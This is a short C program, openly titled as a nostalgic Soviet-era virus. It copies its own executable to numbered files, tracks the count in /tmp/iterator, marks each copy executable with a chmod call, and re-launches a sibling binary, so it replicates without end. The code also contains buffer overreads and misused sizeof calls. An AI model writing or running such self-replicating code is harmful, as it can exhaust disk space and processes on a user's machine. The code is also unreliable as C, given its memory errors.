/*
                                        The Nostalgia of the Era of Soviet Viruses

                                                        COPYRIGHT 


*/
#include <stddef.h>
#include <stdio.h>
#include <limits.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

char *FilePath;
char *command;
unsigned char *buffer;
char *abpath;
char *buffern;
int iterator;

char *convertAB(char *array){
    char *array1 = malloc(1000*(sizeof(char)));
    for(int i = 0;i < 1000;i++){
        array1[i] = array[i];
        if(array[i] == 'A'){
            array1[i] = 'B';
        }
    }
    return array1;
}

int main(int argc,char *argv[]) {
    FILE *fp,*fp1,*fpn;
    unsigned long fileLen;
    FilePath = malloc(600 * sizeof(char));
    command = malloc(3000 * sizeof(char));
    abpath = malloc(2000 * sizeof(char));
    buffern = malloc(100 * sizeof(char));
    realpath(argv[0],abpath);
    strcpy(FilePath,convertAB(abpath));
    fp = fopen(FilePath,"r+b");
    fpn = fopen("/tmp/iterator","r");
    // Changing Output File
    if (access("/tmp/iterator", F_OK ) == 0) {
        fread(buffern,1000, 1, fpn);
        iterator = atoi(buffern);
        sprintf(abpath,"%s%d",abpath,iterator);
    } else {
        sprintf(abpath,"%s0",abpath);
    }
    fp1 = fopen(abpath,"w+b");
    // End
    if (fp == NULL) {
        return 0;
    }
	fseek(fp, 0, SEEK_END);
	fileLen=ftell(fp);
	fseek(fp, 0, SEEK_SET);
    buffer=(unsigned char *)malloc((fileLen+1));
    if (!buffer){
        fclose(fp);
		return 0;
	}
    fread(buffer, fileLen, 1, fp);
    if (access("/tmp/iterator", F_OK ) != 0){
        fpn = fopen("/tmp/iterator","wb");
        fprintf(fpn,"0");
        fclose(fpn);
    } else {
        fread(buffern,100, 1, fpn);
        iterator = atoi(buffern);
        fpn = fopen("/tmp/iterator","wb");
        iterator = iterator + 1;
        //fprintf(fpn,"%d",iterator);
        sprintf(buffern, "%d", iterator);
        fwrite(buffern,sizeof(buffern), 1,fpn);
        fclose(fpn);
    }
    fwrite(buffer,fileLen,1,fp1);
    fclose(fp1);
    fclose(fp);
    sprintf(command,"chmod +x %s",abpath);
    system(command);
    free(buffer);
    execlp(FilePath,FilePath,NULL);
    return 0;
}